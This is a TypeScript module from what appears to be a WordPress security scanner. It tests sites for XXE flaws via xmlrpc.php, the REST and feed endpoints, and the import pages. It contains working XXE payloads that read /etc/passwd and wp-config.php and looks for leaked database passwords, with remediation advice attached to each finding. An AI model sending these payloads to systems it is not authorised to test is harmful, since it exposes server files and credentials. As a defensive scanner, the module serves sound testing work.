import type { Finding, ModuleResult, ScanState } from '../types.js';
import { fetchURL, finding, moduleResult, normalizeTarget } from '../utils.js';

const MODULE_NAME = 'XXE Advanced (XML Handlers)';

// XXE payloads targeting different file paths
const XXE_PAYLOADS = [
  {
    name: 'etc_passwd',
    body: `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
    indicator: 'root:',
  },
  {
    name: 'wp_config',
    body: `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/www/html/wp-config.php">]><foo>&xxe;</foo>`,
    indicator: 'DB_PASSWORD',
  },
  {
    name: 'wp_config_relative',
    body: `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///../wp-config.php">]><foo>&xxe;</foo>`,
    indicator: 'DB_',
  },
];

// XML-RPC XXE test
const XMLRPC_XXE = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value>&xxe;</value></param>
  </params>
</methodCall>`;


// Error-based XXE indicators in responses
const XXE_ERROR_INDICATORS = [
  'failed to open stream',
  'no such file or directory',
  'permission denied',
  'simplexml_load_string',
  'xml_parse_into_struct',
  'DOMDocument',
  'xmlreader',
  'external entities',
  'DOCTYPE is not allowed',
  'SYSTEM identifier',
  'libxml',
  'expat',
];

// Indicators of XXE success (file content leaked)
const SENSITIVE_INDICATORS = [
  'root:',
  'bin:',
  '/bin/bash',
  'DB_PASSWORD',
  'DB_NAME',
  'DB_HOST',
  'define(',
  'secret_key',
];

export async function run(target: string, _state?: ScanState): Promise<ModuleResult> {
  const start = Date.now();
  target = normalizeTarget(target);
  const findings: Finding[] = [];
  const errors: string[] = [];

  try {
    // Run all 4 test sections in parallel — each is independent
    await Promise.allSettled([
      // 1. XML-RPC XXE
      (async () => {
        const xmlrpcUrl = target + '/xmlrpc.php';
        const xmlrpcRes = await fetchURL(xmlrpcUrl, {
          method: 'POST', headers: { 'Content-Type': 'text/xml' }, body: XMLRPC_XXE, timeoutMs: 5_000,
        });
        if (!xmlrpcRes || xmlrpcRes.status === 404) return;
        const body = await xmlrpcRes.text().catch(() => '');
        const sensitive = SENSITIVE_INDICATORS.find(ind => body.includes(ind));
        const errorInd = XXE_ERROR_INDICATORS.find(ind => body.toLowerCase().includes(ind.toLowerCase()));
        if (sensitive) {
          findings.push(finding('XXE_FILE_DISCLOSURE', 'CRITICAL', xmlrpcUrl,
            `XXE file disclosure via XML-RPC — file content leaked in response: '${sensitive}'`,
            { evidence: `indicator="${sensitive}" endpoint="xmlrpc.php" body_excerpt="${body.slice(0, 200)}"`,
              remediation: 'Disable XML-RPC with "add_filter(\'xmlrpc_enabled\', \'__return_false\');". If needed, disable external entities in libxml.' }));
        } else if (errorInd) {
          findings.push(finding('XXE_ERROR_BASED', 'HIGH', xmlrpcUrl,
            `XXE error-based indicator in XML-RPC response: '${errorInd}' — server parses external entities`,
            { evidence: `indicator="${errorInd}" endpoint="xmlrpc.php"`,
              remediation: 'Disable XML-RPC or configure libxml to disable external entity loading: libxml_disable_entity_loader(true).' }));
        }
      })(),

      // 2. WP Import endpoint XXE check
      (async () => {
        const importRes = await fetchURL(target + '/wp-admin/import.php', { timeoutMs: 4_000 });
        if (!importRes || importRes.status !== 200) return;
        const importBody = await importRes.text().catch(() => '');
        const hasForm = importBody.includes('<form');
        const hasFileInput = importBody.toLowerCase().includes('choose file') ||
          importBody.includes('type="file"') || importBody.includes("type='file'");
        const hasImportAction = importBody.toLowerCase().includes('import') && importBody.toLowerCase().includes('upload');
        if (hasForm && (hasFileInput || hasImportAction)) {
          findings.push(finding('XXE_IMPORT_ENDPOINT_EXPOSED', 'MEDIUM', target + '/wp-admin/import.php',
            `WordPress import endpoint accessible without redirect to login — XML import endpoints may be vulnerable to XXE`,
            { evidence: `status=${importRes.status} import_form=true`,
              remediation: 'Ensure wp-admin/import.php requires authentication. Update WordPress to latest version which includes XXE fixes.' }));
        }
      })(),

      // 3. WooCommerce product import XXE probe
      (async () => {
        const wcImportUrl = target + '/wp-admin/edit.php?post_type=product&page=product_importer';
        const wcImportRes = await fetchURL(wcImportUrl, { timeoutMs: 4_000 });
        if (!wcImportRes || wcImportRes.status !== 200) return;
        const wcBody = await wcImportRes.text().catch(() => '');
        if (wcBody.includes('woocommerce') || wcBody.includes('product')) {
          findings.push(finding('XXE_WOOCOMMERCE_IMPORT', 'MEDIUM', wcImportUrl,
            `WooCommerce product importer accessible — XML import feature may be vulnerable to XXE via malicious import file`,
            { evidence: `status=200 woocommerce_importer=true`,
              remediation: 'Disable external entity loading in WooCommerce XML importer. Ensure importer validates XML input before parsing.' }));
        }
      })(),

      // 4. Generic XML endpoints — run only etc_passwd payload in parallel across endpoints
      (async () => {
        const xmlEndpoints = ['/wp-json/wp/v2/posts', '/?feed=rss2'];
        const etcPasswd = XXE_PAYLOADS[0]; // etc_passwd is most definitive
        await Promise.allSettled(xmlEndpoints.map(async ep => {
          try {
            const res = await fetchURL(target + ep, {
              method: 'POST',
              headers: { 'Content-Type': 'application/xml' },
              body: etcPasswd.body,
              timeoutMs: 4_000,
            });
            if (!res || res.status === 404 || res.status === 405) return;
            const body = await res.text().catch(() => '');
            if (body.includes(etcPasswd.indicator)) {
              findings.push(finding('XXE_REST_DISCLOSURE', 'CRITICAL', target + ep,
                `XXE file disclosure via REST/feed endpoint — '${etcPasswd.indicator}' found in response`,
                { evidence: `endpoint="${ep}" payload="${etcPasswd.name}" indicator="${etcPasswd.indicator}"`,
                  remediation: 'Disable XML external entity processing. Use libxml_disable_entity_loader(true) in all XML parsing contexts.' }));
            }
          } catch { /* timeout */ }
        }));
      })(),
    ]);
  } catch (e) {
    errors.push(String(e));
  }

  return moduleResult(MODULE_NAME, target, findings, errors, start);
}
